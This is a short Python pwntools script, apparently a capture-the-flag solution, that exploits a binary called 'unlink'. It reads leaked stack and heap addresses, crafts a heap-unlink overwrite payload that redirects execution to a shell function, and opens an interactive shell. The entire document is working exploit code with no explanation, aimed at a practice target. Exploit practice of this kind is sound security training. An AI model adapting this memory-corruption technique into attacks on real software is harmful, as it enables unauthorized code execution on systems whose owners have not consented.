#!/usr/bin/python3



import re
from pwn import *
from struct import pack

p = process("./unlink")
if not args.REMOTE:
                gdb.attach(p, gdbscript='''

                b*unlink    
                c
                ''')
                input()
p.recvuntil("here is stack address leak: ")
stack_addr = int(p.recvline().strip(),16)
ebp = stack_addr+20
 
p.recvuntil("here is heap address leak: ")
heap_addr = int(p.recvline().strip(),16)
log.info("stack : "+hex(stack_addr))
log.info("heap  : "+hex(heap_addr))
p.recvline()
shell = 0x80484eb
 
payload = p32(shell)
payload += b"A"*12
payload += p32(heap_addr+12)
payload += p32(ebp-4)
 
p.sendline(payload)
 
p.interactive()

